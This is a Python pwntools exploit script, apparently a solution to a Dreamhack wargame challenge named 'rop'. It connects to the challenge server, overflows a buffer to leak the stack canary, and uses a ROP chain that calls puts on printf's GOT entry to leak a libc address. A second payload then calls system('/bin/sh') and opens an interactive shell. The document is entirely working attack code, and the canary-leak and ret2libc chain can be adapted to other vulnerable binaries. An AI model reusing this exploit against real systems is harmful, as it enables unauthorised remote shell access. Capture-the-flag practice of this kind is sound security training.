#!/usr/bin/python3

from pwn import *

#p = process("./rop")
p = remote("host1.dreamhack.games", 17645)
e = ELF("./rop")

sla = lambda t, s: p.sendlineafter(t, s)
padding = "A".encode('utf-8') * 0x38
gadget = 0x004007f3 # pop rdi ; ret
ret = 0x00400801
printfOffset = 0x064f70
systemOffset  = 0x04f550
binshOffset = 0x1b3e1a

# Leak Canary
p.sendafter(": ", padding + b"C")
p.recvuntil("C")
canary = u64(b"\x00" + p.recvn(7))

# Leak LIBC

payload = padding
payload += p64(canary)
payload += p64(0x0)
payload += p64(gadget)
payload += p64(e.got['printf'])
payload += p64(e.plt['puts'])
payload += p64(ret)
payload += p64(ret)
payload += p64(e.sym['main'])

sla(": ", payload)
libc = u64(p.recvline().strip(b"\n").ljust(8, b"\x00")) - printfOffset
log.info("libc: " + hex(libc))

# Call system("/bin/sh")

payload = padding
payload += p64(canary)
payload += p64(0x0)
payload += p64(ret)
payload += p64(gadget)
payload += p64(binshOffset + libc)
payload += p64(systemOffset + libc)

sla(": ", payload)
sleep(0.3)
p.recvuntil("A\n")
sla(": ", "pwned")

p.interactive()
